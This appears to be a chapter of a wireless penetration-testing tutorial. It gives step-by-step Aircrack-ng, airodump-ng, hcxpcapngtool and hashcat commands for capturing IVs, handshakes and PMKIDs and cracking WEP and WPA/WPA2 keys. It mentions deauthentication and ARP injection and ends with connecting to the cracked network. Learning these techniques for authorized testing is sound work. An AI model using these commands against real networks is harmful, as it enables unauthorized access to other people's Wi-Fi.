# Chain #6: Cracking Keys

This chain covers how to use **Aircrack-ng** to crack WEP and WPA/WPA2 keys once you’ve already captured the necessary packets (IVs or handshakes). The process is fully offline: no live interaction with access points after capture.

---

## Step 1: Benchmarking Your System

Before cracking, test CPU performance to estimate cracking speed.

```bash
sudo aircrack-ng -S
```
- `-S` → Benchmark mode, tests key-cracking speed.
- Output: keys/second rate (k/s). Higher is better.

**Why this matters**: Cracking WPA with a large wordlist can take hours/days. Knowing your system’s speed lets you plan accordingly.

---

## Step 2: Cracking WEP Keys

### 2.1 Capture IVs with Airodump-ng

WEP cracking depends on Initialization Vectors (IVs). You need thousands to succeed.

```bash
sudo airodump-ng --ivs -w capture wlan0mon
```
- `--ivs` → Save only IVs (smaller file size, faster analysis).
- `-w capture` → Output file prefix.

### 2.2 Run Aircrack-ng with Korek Method

```bash
sudo aircrack-ng -K capture.ivs
```
- `-K` → Use Korek WEP attack (collection of statistical cracking methods).
- `capture.ivs` → File containing IVs.

**Output**: Displays tested keys until WEP key is found.

**Scenario Note**:
- If you don’t have enough IVs, combine with Aireplay-ng ARP injection attacks to speed up IV generation.

---

## Step 3: Cracking WPA/WPA2 Keys

### 3.1 Capture a Handshake

Use Airodump-ng to capture the WPA 4-way handshake.
- Deauthentication attacks with Aireplay-ng help force clients to reconnect, generating the handshake.

```bash
sudo airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
```
- `-c <channel>` → Stay on target channel.
- `--bssid <AP_MAC>` → Lock on specific AP.
- `-w capture` → Save packets.

Look for `WPA handshake: <BSSID>` in top-right corner of output.

### 3.1b Extract for Hashcat (mode 22000)

```
# Extract WPA handshake/PMKID into Hashcat's 22000 format
hcxpcapngtool -o hackme.22000 hackme-01.cap
```
- Produces a `.22000` file for `hashcat -m 22000`. Faster/cleaner than older formats.
### 3.2 Run Aircrack-ng with Wordlist

```bash
sudo aircrack-ng capture.cap -w /path/to/wordlist.txt
```
- `capture.cap` → File with captured handshake.
- `-w /path/to/wordlist.txt` → Dictionary file with possible passwords.

**Scenario Notes**:
- WPA cracking requires a wordlist. Pure brute-force (all combinations) is impractical.
- If handshake is partial (missing packets), Aircrack-ng may still crack if it has packets 2+3 or 3+4.

### 3.2b Legacy: convert to HCCAPX for Hashcat (mode 2500)

```
# Legacy export for Hashcat mode 2500 (.hccapx)
sudo aircrack-ng capture.cap -J hackme
# -> hackme.hccapx (use: hashcat -m 2500 hackme.hccapx /path/to/wordlist.txt)
```
- Useful when following older guides that still expect `.hccapx`.
### 3.3 PMKID-Based Cracking (Alternative)

Some WPA networks allow PMKID extraction without clients.

```bash
sudo aircrack-ng capture.cap -w /path/to/wordlist.txt
```
- Works the same way if capture contains PMKID.

---

## Step 4: Verifying the Key

Once a key is found, Aircrack-ng will display:
- **KEY FOUND! [ password ]**
- Derived Master/Transient keys

You can then test it by connecting to the network (see Chain #7).